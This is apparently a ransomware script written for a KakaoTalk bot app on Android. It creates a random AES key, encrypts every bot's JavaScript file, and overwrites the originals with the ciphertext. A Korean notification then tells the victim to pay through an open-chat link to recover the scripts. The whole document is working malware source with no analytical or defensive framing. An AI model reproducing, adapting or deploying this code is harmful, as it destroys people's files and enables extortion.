importClass(java.util.Base64);
importClass(javax.crypto.Cipher);
importClass(javax.crypto.spec.SecretKeySpec);
importClass(javax.crypto.spec.IvParameterSpec);
if(!FileStream.read("sdcard/Android/data/p")) FileStream.write("sdcard/Android/p",w(0xA));

Api.makeNoti("당신의 스크립트는 모두 암호화 되었습니다.\nhttps://open.kakao.com/o/sdQGKklg 이 링크에 갠을 오셔서 돈을 입금하시면 플어드릴수 있습니다.\n참고로 한자로도 지우면 복구가 불가능합니다",""),
function n (x, e) {
    let cipher = r (e, Cipher.ENCRYPT_MODE);
    let encrypted = cipher.doFinal(java.lang.String(x).getBytes("UTF-8"));
    return Base64.getEncoder().encodeToString(encrypted);
}
function w (s) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+€£¥₩.,';
    let res = []
    let index = 0;
    while (index < s) {
        let random = chars[Math.random() * chars.length >> 0]
        if (!res.includes(random)) {
            res += random;
            index++;
        }
    }
    return res;
}

function r (k , m) {
    let keyBytes = java.util.Arrays.copyOf(java.lang.String(k).getBytes("UTF-8"), 16);
    let secretKey = new SecretKeySpec(keyBytes, "AES");
    let iv = new IvParameterSpec(keyBytes);
    let cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(m, secretKey, iv);
    return cipher;
}
let key = FileStream.read ("sdcard/Android/p")
 let h = [] 
 java.io.File(com.xfl.msgbot.utils.SharedVar.Companion.botsPath).list().slice().forEach(e=>{
let u = java.io.File(com.xfl.msgbot.utils.SharedVar.Companion.botsPath+"/"+e).listFiles().slice().find(e=>String(e).endsWith(".js"))
let k = FileStream.read(u)
if(k == null) return;
try{
h.push({d:
n(k,key),p:u});
}catch(e){}});
h.map(e=>{
FileStream.write(e.p,"//"+e.d);
});  
